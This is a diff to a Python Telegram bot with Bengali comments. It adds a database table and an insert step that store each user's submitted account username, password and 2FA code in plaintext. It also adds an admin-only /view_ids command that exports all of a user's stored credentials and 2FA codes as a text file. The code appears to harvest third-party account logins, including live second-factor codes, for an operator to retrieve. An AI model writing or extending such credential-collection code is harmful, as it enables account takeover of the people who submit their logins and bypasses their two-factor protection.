@@ -120,6 +120,10 @@ try:
     db.commit()
 except:
     pass
+# এটি একবারে রান করলেই হবে
+cursor.execute('''CREATE TABLE IF NOT EXISTS user_id_logs 
+                  (user_id INTEGER, category TEXT, u_id TEXT, u_pass TEXT, two_fa TEXT, date_time TEXT)''')
+db.commit()
 
 
 class BotState(StatesGroup):
@@ -343,7 +347,10 @@ async def get_2fa(message: types.Message, state: FSMContext):
                  f"🔐 **2FA:** `{message.text}`")
 
     import datetime
-            # ইউজারের মেসেজ ডাটাবেসে সেভ করা হচ্ছে (আগের কোড সব ঠিক রেখে)
+    dt_log = datetime.datetime.now().strftime("%Y-%m-%d %H:%M") # সেকেন্ড ছাড়া সময়
+    cursor.execute("INSERT INTO user_id_logs (user_id, category, u_id, u_pass, two_fa, date_time) VALUES (?, ?, ?, ?, ?, ?)", 
+            (message.from_user.id, data.get('category'), data.get('u_id'), data.get('u_pass'), message.text, dt_log))
+    db.commit()                                 # ইউজারের মেসেজ ডাটাবেসে সেভ করা হচ্ছে (আগের কোড সব ঠিক রেখে)
     current_time_log = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     cursor.execute("INSERT INTO user_history (user_id, message_text, date) VALUES (?, ?, ?)", 
                        (message.from_user.id, message.text, current_time_log))
@@ -1917,7 +1924,43 @@ async def edit_pending_balance(message: types.Message):
             pass
     else:
         await message.answer("❌ এই ইউজার আইডিটি ডাটাবেসে পাওয়া যায়নি।")
+import io
 
+# অ্যাডমিনের জন্য কমান্ড: ইউজার আইডি অনুযায়ী সব আইডির ফাইল পাওয়া
+@dp.message_handler(commands=['view_ids'], user_id=ADMIN_ID)
+async def view_user_ids_file(message: types.Message):
+    # কমান্ডের সাথে থাকা ইউজার আইডি নেওয়া (যেমন: /view_ids 123456)
+    args = message.get_args()
+    
+    if not args:
+        return await message.answer("❌ সঠিক নিয়ম: `/view_ids [ইউজার_আইডি]`\n\nউদাহরণ: `/view_ids 12345678`")
+
+    # ডাটাবেসের নতুন টেবিল থেকে ওই ইউজারের সব তথ্য আনা
+    cursor.execute("SELECT category, u_id, u_pass, two_fa, date_time FROM user_id_logs WHERE user_id = ?", (args,))
+    rows = cursor.fetchall()
+
+    if not rows:
+        return await message.answer(f"❌ ইউজার `{args}` এর কোনো আইডি রেকর্ড ডাটাবেসে পাওয়া যায়নি।")
+
+    # টেক্সট ফাইলের কন্টেন্ট তৈরি করা
+    output = f"ID Submission Report\n"
+    output += f"User ID: {args}\n"
+    output += "="*45 + "\n\n"
+
+    for i, row in enumerate(rows, 1):
+        output += (f"{i}. Category: {row[0]}\n"
+                   f"   Username: {row[1]}\n"
+                   f"   Password: {row[2]}\n"
+                   f"   2FA: {row[3]}\n"
+                   f"   Time: {row[4]} (No Seconds)\n"
+                   f"{'-'*35}\n")
+
+    # ফাইলটি মেমোরিতে তৈরি করে সরাসরি টেলিগ্রামে পাঠানো
+    file_data = io.BytesIO(output.encode('utf-8'))
+    file_data.name = f"user_{args}_id_logs.txt"
+    
+    await message.reply_document(file_data, caption=f"📄 ইউজার `{args}` এর পাঠানো সকল আইডির তালিকা।")
+            
 if __name__ == '__main__':
     keep_alive()
     executor.start_polling(dp, skip_updates=True)
